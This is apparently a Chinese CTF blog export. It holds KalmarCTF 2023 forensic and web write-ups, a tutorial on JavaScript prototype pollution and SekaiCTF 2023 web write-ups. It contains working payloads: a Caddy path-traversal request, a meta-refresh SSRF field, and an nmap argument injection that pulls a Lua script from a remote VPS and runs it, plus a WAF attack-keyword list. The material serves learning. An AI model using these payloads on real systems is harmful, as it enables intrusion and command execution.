<p>之后的就是通过噪声定位物体<a href="https://github.com/balzer82/Kalman/blob/master/Kalman-Filter-CA.ipynb">https://github.com/balzer82/Kalman/blob/master/Kalman-Filter-CA.ipynb</a></p>
<p>来生成过滤脚本，画出二维，记录最大的x和最小的x，如果之间的差距过大，记为0，否则记为1，然后转ascii即可</p>
<p>ps：前五个数据不要，本来手动跑的，预判第一个字符是k，但是复现出不来还怀疑是我的问题</p>
<p><img src="/img/image-20230312173012382.png" alt="WeirdTable" /></p>
<h2 id="forensic">forensic</h2>
<h3 id="lleHSyniT">lleHSyniT!</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings proc.dmp  | grep -i kalmar</span><br><span class="line">password:kalmar&#123;My_F4v0r1t3_G4m3_1s_Cobalt_Strike:gL0b4l_0p3r4t0rs&#125;</span><br></pre></td></tr></table></figure>
<h3 id="cards">cards</h3>
<p>tcp 79流之后提取出字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in &#123;79..157&#125;; do tshark -r cards.pcap -qz follow,tcp,raw,$i | awk &#x27;&#123;a[NR]=$0&#125;END&#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, a[NR-1]); printf &quot;%s &quot;, a[NR-1]&#125;&#x27; &gt;&gt; output.txt;done</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r cards.pcap -qz follow,tcp,raw,$i</span><br><span class="line">这个命令用于从PCAP文件中读取网络数据包并显示特定的TCP流的原始数据。</span><br><span class="line"></span><br><span class="line">其中，-r选项指定要读取的PCAP文件，-q选项指定使用“quiet”模式，即只输出所需的内容。</span><br><span class="line">-z选项指定要执行的协议分析器并指定相关选项，这里使用了follow,tcp,raw选项来表示要跟踪TCP流并输出其原始数据。</span><br><span class="line"></span><br><span class="line">$i表示要跟踪的TCP流的编号，利用bash循环得到79-157的tcp流</span><br><span class="line"></span><br><span class="line">具体来说，follow,tcp,raw选项将会对每个TCP流分别执行以下操作：</span><br><span class="line">以ASCII码形式显示TCP流的起始和结束时间，源地址和目的地址，以及TCP端口号。</span><br><span class="line">显示TCP流的原始数据（以十六进制和ASCII码形式显示）。</span><br><span class="line"></span><br><span class="line">如果只是需要原始数据，使用tshark -r cards.pcap -T fields -e data</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;a[NR]=$0&#125;END&#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, a[NR-1]); printf &quot;%s &quot;, a[NR-1]&#125;&#x27;</span><br><span class="line">1. awk：启动 AWK 解释器。</span><br><span class="line">2. &#x27;&#123;&#125;&#x27;：包含 AWK 程序，其中单引号确保 shell 不解释程序。</span><br><span class="line">3. a[NR]=$0：创建一个名为 a 的数组，并将当前行的值（$0）分配给数组中具有当前行号（NR）的元素。这意味着输入的第一行将存储在 a[1] 中，第二行将存储在 a[2] 中，依此类推。</span><br><span class="line">4. END&#123;&#125;：表示在读取完所有输入行后执行的代码块。</span><br><span class="line">5. gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, a[NR-1])：使用 gsub() 函数从输入的倒数第二行（a[NR-1]）全局替换所有开头和结尾的空格字符为空字符串。正则表达式 /^[ \t]+|[ \t]+$/ 匹配字符串开头 (^) 或结尾 ($) 处的一个或多个空格或制表符 ([ \t]+)。gsub() 函数返回进行的替换次数，但此命令未使用此值。</span><br><span class="line">6. printf &quot;%s &quot;, a[NR-1]：使用 printf() 函数打印修改后的输入的倒数第二行（a[NR-1]），并附加一个空格字符 (&quot; &quot;)。%s 格式说明符指定要打印的字符串参数，这种情况下为修改后的倒数第二行。</span><br></pre></td></tr></table></figure>
<p>因此，这个 AWK 命令基本上逐行读取输入，将每行存储在一个数组中，从输入的倒数第二行中删除开头和结尾的空格字符，然后打印修改后的倒数第二行，并带有一个空格字符。</p>
<p>打乱的字符通过长度为135的ftp获得cwd目录顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r cards.pcap -Y &quot;frame.len == 135 and ftp.current-working-directory&quot; -T fields -e ftp.current-working-directory</span><br></pre></td></tr></table></figure>
<ol>
<li><code>tshark</code>：启动 tshark 工具。</li>
<li><code>-r cards.pcap</code>：指定要读取的 pcap 文件的路径和名称。</li>
<li><code>-Y &quot;frame.len == 135 and ftp.current-working-directory&quot;</code>：使用 Wireshark 显示过滤器语法来筛选符合条件的数据包。<code>frame.len == 135</code> 表示数据包长度为 135，这是某些 FTP 客户端发送 PWD 命令时的预期长度。<code>ftp.current-working-directory</code> 表示匹配包含 FTP 工作目录的数据包。</li>
<li><code>-T fields</code>：指定输出格式为字段形式。</li>
<li><code>-e ftp.current-working-directory</code>：指定要提取的字段，这里是 FTP 工作目录。</li>
</ol>
<p>写脚本重排就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = &#x27;m_tfwr_flf_3eccaykdw_hhuhrld&#123;erae\n_onsuo&#125;04afr__ar_u1ut_ksffklas_hsce33f_e3p_hn&#x27;</span><br><span class="line"></span><br><span class="line">s = [345, 377, 378, 385, 387, 404, 368, 352, 354, 361, 383, 413, 355, 381, 397, 403, 369, 382, 400, 418, 386, 408, 388,</span><br><span class="line">     409, 358, 399, 412, 414, 348, 363, 347, 366, 405, 420, 364, 370, 416, 357, 359, 384, 419, 417, 380, 346, 353, 390,</span><br><span class="line">     392, 406, 343, 379, 396, 371, 362, 351, 393, 372, 373, 407, 411, 410, 342, 344, 398, 401, 356, 394, 349, 365, 391,</span><br><span class="line">     375, 395, 360, 402, 389, 374, 376, 415, 350, 367]</span><br><span class="line"></span><br><span class="line">cwd = [i - min(s) for i in s]</span><br><span class="line">print(cwd)</span><br><span class="line">for i in range(79):</span><br><span class="line">    j=cwd.index(i)</span><br><span class="line">    print(m[j],end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="sewing-waste-and-agriculture-leftovers">sewing-waste-and-agriculture-leftovers</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -2 -r swaal.pcap -R &quot;udp.port==9999&quot; -T fields -e data | tr -d &#x27;\n&#x27; | fold -w 120 | while read l; do echo &quot;$l&quot; | xxd -r -p | tr -d &#x27;\n&#x27;; echo; done &gt; raw_bytes.txt</span><br></pre></td></tr></table></figure>
<ol>
<li><code>-R &quot;udp.port==9999&quot;</code>：使用 Wireshark 显示过滤器语法来筛选符合条件的数据包。这里表示仅提取 UDP 端口为 9999 的数据包。</li>
<li><code>-T fields</code>：指定输出格式为字段形式。</li>
<li><code>-e data</code>：指定要提取的字段，这里是 UDP 数据包的数据字段。</li>
<li><code>tr -d '\n'</code>：使用 <code>tr</code> 命令删除输出中的所有换行符，以便将所有提取的数据合并到一行中。</li>
<li><code>fold -w 120</code>：使用 <code>fold</code> 命令将长行分成每行 120 个字符。这样做是为了在输出中使数据更易读。</li>
<li><code>while read l; do</code>：使用 <code>while</code> 循环读取每个行，并将其存储在变量 <code>l</code> 中。</li>
<li><code>echo &quot;$l&quot; | xxd -r -p</code>：使用 <code>xxd</code> 命令将十六进制字符串转换为原始字节。</li>
<li><code>tr -d '\n'</code>：使用 <code>tr</code> 命令删除输出中的所有换行符，以便将所有字节合并到一行中。</li>
<li><code>echo</code>：使用 <code>echo</code> 命令输出一个换行符，以便将每行输出到不同的行中。</li>
<li><code>done &gt; raw_bytes.txt</code>：将输出重定向到文件 <code>raw_bytes.txt</code> 中。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in &#123;1..58&#125;; do cat raw_bytes.txt | cut -b &quot;$i&quot; | sort -u | tr -d &#x27;\n&#x27;; done; echo</span><br></pre></td></tr></table></figure>
<ol>
<li><code>cut -b &quot;$i&quot;</code>：使用 cut 命令提取一个字符串的第 i 个字节。</li>
<li><code>sort -u</code>：使用 sort 命令对提取的字节进行排序并去重。<code>-u</code> 选项告诉 sort 命令只输出不同的行。</li>
<li><code>tr -d '\n'</code>：使用 tr 命令删除输出中的所有换行符，以便将所有去重的字节合并到一行中。</li>
</ol>
<h2 id="web">web</h2>
<h3 id="caddy">caddy</h3>
<p>docker文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3.7&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  caddy:</span><br><span class="line">    image: caddy:2.4.5-alpine</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:80&quot;</span><br><span class="line">      - &quot;443:443&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./files/Caddyfile:/etc/caddy/Caddyfile:ro</span><br><span class="line">      - ./files:/srv</span><br><span class="line">      - caddy_data:/data</span><br><span class="line">      - caddy_config:/config</span><br><span class="line">    command: sh -c &quot;apk add --update openssl nss-tools &amp;&amp; rm -rf /var/cache/apk/ &amp;&amp; openssl req -x509 -batch -newkey rsa:2048 -nodes -keyout /etc/ssl/private/caddy.key -days 365 -out /etc/ssl/certs/caddy.pem -subj &#x27;/C=DK/O=Kalmarunionen/CN=*.caddy.chal-kalmarc.tf&#x27; &amp;&amp; mkdir -p backups/ &amp;&amp; cp -r *.caddy.chal-kalmarc.tf backups/ &amp;&amp; rm php.caddy.chal-kalmarc.tf/flag.txt &amp;&amp; sleep 1 &amp;&amp; caddy run&quot;</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  caddy_data:</span><br><span class="line">    external: true</span><br><span class="line">  caddy_config:</span><br></pre></td></tr></table></figure>
<p>其中将flag复制到backups，删除了flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command: 指定在启动容器时要运行的命令。它使用&quot;sh -c&quot;运行一系列命令。</span><br><span class="line">首先使用&quot;apk add&quot;命令安装一些必要的包，然后使用&quot;openssl req&quot;命令生成自签名证书，并将其复制到指定的位置。</span><br><span class="line">接着，它创建一个名为&quot;backups&quot;的目录，并将所有以&quot;.caddy.chal-kalmarc.tf&quot;结尾的文件夹复制到该目录中。</span><br><span class="line">然后，它从&quot;php.caddy.chal-kalmarc.tf&quot;目录中删除&quot;flag.txt&quot;文件，并在1秒后启动Caddy服务。</span><br></pre></td></tr></table></figure>
<p><a href="http://php.caddy.chal-kalmarc.tf/flag.txt%E5%B7%B2%E7%BB%8F%E8%A2%AB%E5%88%A0%E9%99%A4%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E6%98%AF%E8%A6%81%E8%AE%BF%E9%97%AE%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/backups/..../flag.txt%EF%BC%8C">php.caddy.chal-kalmarc.tf/flag.txt已经被删除，那么就是要访问到备份文件/backups/..../flag.txt，</a></p>
<p>根据<a href="https://github.com/caddyserver/caddy/pull/4407">https://github.com/caddyserver/caddy/pull/4407</a></p>
<p>也就是说存在可以访问/backups/…/flag.txt的方法，只需要抓包修改url访问//flag.txt和host为/backups/php.caddy.chal-kalmarc.tf即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --path-as-is -k --resolve php.caddy.kalmarc.tf:443:172.18.0.1 http://php.caddy.kalmarc.tf//flag.txt -H &#x27;Host: backups/php.caddy.kalmarc.tf&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Invoiced">Invoiced</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用meta来重定向..... 学习了</span><br><span class="line"></span><br><span class="line">http-equiv：定义与 HTTP 头部一起使用的名称。如果网页从 Web 服务器传送，则该属性会被忽略。</span><br><span class="line">http-equiv 是 &lt;meta&gt; 标签中的一个可选属性，用于模拟 HTTP 头信息中的一些属性。当 http-equiv 属性被设置时，content 属性必须也被设置，以提供额外的信息。</span><br><span class="line">http-equiv 属性通常用于控制页面的缓存、重定向、字符集、XSS保护等行为。以下是一些常用的 http-equiv 属性：</span><br><span class="line">content-language：指定文档的语言，如 &lt;meta http-equiv=&quot;content-language&quot; content=&quot;zh-CN&quot;&gt; 表示页面使用简体中文语言。</span><br><span class="line">expires：指定网页的到期时间，如 &lt;meta http-equiv=&quot;expires&quot; content=&quot;Tue, 01 Jan 2030 00:00:00 GMT&quot;&gt; 表示网页的到期时间是 2030 年 1 月 1 日。</span><br><span class="line">refresh：指定网页的刷新时间和重定向地址，如 &lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;URL=http://www.example.com/&quot;&gt; 表示网页将在 5 秒后自动刷新并重定向到 http://www.example.com/。</span><br><span class="line">content-type：指定网页的 MIME 类型和字符集，如 &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt; 表示网页是 HTML 格式，并使用 UTF-8 字符集。</span><br><span class="line">X-UA-Compatible：指定浏览器的兼容模式，如 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; 表示强制使用最新的 IE 内核。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">address=asd&amp;discount=FREEZTUFSSZ1412&amp;email=8870%40qq.com&amp;name=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://127.0.0.1:5000/orders&quot;&gt;&amp;phone=1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>JS原型链污染</title>
    <url>/2023/08/25/19-10-34/</url>
    <content><![CDATA[<h1>JS 原型链污染</h1>
<span id="more"></span>
<p>参考连接：</p>
<p><a href="https://juejin.cn/post/6984678359275929637">一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)</a></p>
<p><a href="https://blog.csdn.net/qq_51586883/article/details/119867720">js原型链污染(超详细)_javascript原型链污染_l_abour的博客-CSDN博客</a></p>
<h2 id="前置知识">前置知识</h2>
<ol>
<li>
<p>JS的复杂类型都是对象类型（<strong>Object</strong>），作为不是完全的面对对象编程的语言，需要使用构造函数进行继承的机制</p>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成实例</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;zhangsan&#x27;</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>对于无法共享公共属性的问题，使用<code>原型对象</code>，来存储这个<code>构造函数</code>的公共属性以及方法。（主角登场）</p>
</li>
<li>
<p>构造函数的<code>prototype</code>以及每个通过<code>构造函数</code>创建出来的<code>实例对象</code>，其本身有个属性<code>__proto__</code>，这个属性会指向该<code>实例对象</code>的<code>构造函数</code>的<code>原型对象</code></p>
</li>
</ol>
<p>就是说如图所示</p>
<p><img src="/img/image-20230825191928584.png" alt="image-20230825191928584" /></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Preson</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 所有实例共享的公共方法</span></span><br><span class="line"><span class="title class_">Preson</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span> (<span class="params">word</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>说：<span class="subst">$&#123;word&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Preson</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="number">18</span>); <span class="comment">// 创建一个Person实例对象</span></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="title class_">Preson</span>(<span class="string">&#x27;李四&#x27;</span>, <span class="number">20</span>); <span class="comment">// 新创建一个Proson实例对象</span></span><br><span class="line">p1.<span class="title function_">say</span>(<span class="string">&#x27;hello world&#x27;</span>); <span class="comment">// 调用公共方法</span></span><br><span class="line">p1.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;say&#x27;</span>) <span class="comment">// false 说明不是定义在其本身上的</span></span><br><span class="line">p1.<span class="property">__proto__</span>.<span class="property">do</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;往原型对象中添加方法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">p2.<span class="title function_">do</span>(); <span class="comment">// 打印出了-往原型对象中添加方法</span></span><br></pre></td></tr></table></figure>
<h2 id="利用">利用</h2>
<p>基于上述原理，存在的漏洞点是不安全的对象递归合并，只有不安全的递归合并函数才会导致原型链污染，非递归的算法是不会导致原型链污染的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1,&quot;__proto__&quot;:&#123; &quot;b&quot;: 2 &#125; &#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">merge</span>(o1, o2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>); <span class="comment">//1,2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>); <span class="comment">//2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：<strong>let o2 = {a: 1, “<code>__proto__</code>”: {b: 2}}<strong>中的proto已经作为的是o2的原型，也就是说这里</strong>o2[<code>__proto__</code>]={b:2}(一个对象）并没有被解析成为键名</strong>，所以需要JSON.parse将其转成json格式</p>
<p>第一步o1[‘a’]=o2[‘a’]</p>
<p>第二步，会将<code>__proto__</code>当作键值来看，然后进入if语句中，然后<code>o1['__proto__']['b']=o2['__proto__']['b']</code>,然后相当于<code>o1.__proto__.b=2</code>成功污染</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>2023sekaiCTF</title>
    <url>/2023/09/04/10-26-47/</url>
    <content><![CDATA[<h1 id="2023sekaiCTF"><a href="#2023sekaiCTF" class="headerlink" title="2023sekaiCTF"></a>2023sekaiCTF</h1><span id="more"></span>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Scanner-Service"><a href="#Scanner-Service" class="headerlink" title="Scanner Service"></a>Scanner Service</h3><p>对于这道题目，是Ruby，然后审计了一下代码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">valid_port?</span>(<span class="params">input</span>)</span><br><span class="line">  !input.<span class="literal">nil</span>? <span class="keyword">and</span> (<span class="number">1</span>..<span class="number">65535</span>).cover?(input.to_i)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_ip?</span>(<span class="params">input</span>)</span><br><span class="line">  pattern = <span class="regexp">/\A((25[0-5]|2[0-4]\d|[01]?\d&#123;1,2&#125;)\.)&#123;3&#125;(25[0-5]|2[0-4]\d|[01]?\d&#123;1,2&#125;)\z/</span></span><br><span class="line">  !input.<span class="literal">nil</span>? <span class="keyword">and</span> !!(input =~ pattern)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chatgpt code :-)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_input</span>(<span class="params">input_string</span>)</span><br><span class="line">  escaped_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  input_string.each_char <span class="keyword">do</span> |<span class="params">c</span>|</span><br><span class="line">    <span class="keyword">case</span> c</span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\ &#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;$&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\$&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;`&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\`&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;\\&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;|&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\|&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&amp;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;(&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\(&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&#x27;)&#x27;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\)&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\n&#x27;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">      escaped_string &lt;&lt; <span class="string">&#x27;\\*&#x27;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      escaped_string &lt;&lt; c</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  escaped_string</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在此处的ip使用了正则，没有漏洞，但是port只是简单的使用了数字判断端口，所以在ruby中只要开头的数字符合就可以</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">puts valid_port?(<span class="string">&quot;92aa&quot;</span>);</span><br><span class="line"><span class="regexp">//</span><span class="title class_">True</span></span><br></pre></td></tr></table></figure>
<p>然后对输入的命令进行了过滤，基本上我想不到什么方法对其进行命令注入，但是放入的命令会用于nmap的命令执行，那么就可以根据nmap的选项进行注入操作，可以根据<a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a>  之中存在的一个file download对其进行木马的注入</p>
<p><img src="/img/image-20230904110025886.png" alt="image-20230904110025886"></p>
<p>开启vps的80端口，在下面放入需要执行的脚本poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.execute(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然后抓包，将文件传入(利用tab过掉空格)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=43.139.154.219%3A80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=poc</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230904110309274.png" alt="image-20230904110309274"></p>
<p>即可发现存在访问</p>
<p>进入容器去查看文件位置</p>
<p><img src="/img/image-20230904111134085.png" alt="image-20230904111134085"></p>
<p>然后执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=43.139.154.219%3A80%09--script%09/tmp/43.139.154.219/80/poc</span><br></pre></td></tr></table></figure>
<p>补充：</p>
<p>nmap的—script的扩展脚本是lua语言，所以使用的是lua的命令执行</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(cmd)</span><br></pre></td></tr></table></figure>
<h3 id="Frog-WAF"><a href="#Frog-WAF" class="headerlink" title="Frog-WAF"></a>Frog-WAF</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sekai.app.waf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AttackTypes</span> &#123;</span><br><span class="line">    SQLI(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;#&quot;</span>),</span><br><span class="line">    XSS(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>),</span><br><span class="line">    OS_INJECTION(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;*&quot;</span>),</span><br><span class="line">    CODE_INJECTION(<span class="string">&quot;for&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;goto&quot;</span>, <span class="string">&quot;if&quot;</span>),</span><br><span class="line">    JAVA_INJECTION(<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;java&quot;</span>, <span class="string">&quot;Name&quot;</span>, <span class="string">&quot;char&quot;</span>, <span class="string">&quot;Process&quot;</span>, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;Char&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;false&quot;</span>),</span><br><span class="line">    IDK(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] attackStrings;</span><br><span class="line"></span><br><span class="line">    AttackTypes(String... attackStrings) &#123;</span><br><span class="line">        <span class="built_in">this</span>.attackStrings = attackStrings;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对输入进行了检测，过滤了运算符号和数字以及java的敏感类</p>
<p>赛后复现的时候，对各位大佬的blog以及官方wp进行学习</p>
<p><a href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></p>
<p><a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></p>
<p><a href="http://www.luelueking.com/archives/1693226708524">http://www.luelueking.com/archives/1693226708524</a></p>
<p>算是一个扫盲，学习了一下EL注入手法以及任意字符的构造</p>
